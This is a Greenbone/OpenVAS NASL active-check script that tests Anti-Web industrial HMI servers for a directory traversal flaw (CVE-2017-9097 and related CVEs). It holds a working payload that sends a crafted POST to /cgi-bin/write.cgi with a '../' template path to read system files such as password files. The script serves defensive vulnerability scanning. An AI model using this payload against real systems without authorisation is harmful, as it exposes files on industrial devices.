# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:anti-web:anti-web";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106886");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2017-06-20 13:53:33 +0700 (Tue, 20 Jun 2017)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-09 23:30:00 +0000 (Wed, 09 Oct 2019)");

  script_cve_id("CVE-2017-9097", "CVE-2017-9664", "CVE-2017-17888");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Anti-Web Directory Traversal Vulnerability (May 2017) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_antiweb_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("antiweb/installed");

  script_tag(name:"summary", value:"Anti-Web is prone to a directory traversal vulnerability where
  an unauthenticated attacker can read arbitrary files.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"solution", value:"Some vendors have started to provide firmware updates.
  Please see the references or contact your vendor for more information or possible updates.");

  script_xref(name:"URL", value:"https://misteralfa-hack.blogspot.cl/2017/05/apps-industrial-ot-over-server-anti-web.html");
  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-17-222-05");
  script_xref(name:"URL", value:"https://github.com/ezelf/AntiWeb_testing-Suite/tree/master/RCE");
  script_xref(name:"URL", value:"http://search-ext.abb.com/library/Download.aspx?DocumentID=9AKK107045A1782&LanguageCode=en&DocumentPartId=&Action=Launch");
  script_xref(name:"URL", value:"https://www.netbiter.com/docs/default-source/netbiter-english/software/hms-security-advisory-2017-05-24-001-ws100-ws200-ec150-ec250.zip");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/cgi-bin/write.cgi";

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  data = "page=/&template=../../../../../../" + file;

  req = http_post_put_req(port: port, url: url, data: data,
                          add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
  res = http_keepalive_send_recv(port: port, data: req);

  if (egrep(string: res, pattern: pattern, icase: TRUE)) {
    report = "It was possible to obtain the /" + file + " file through a HTTP POST request on " +
             http_report_vuln_url(port: port, url: url, url_only: TRUE);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
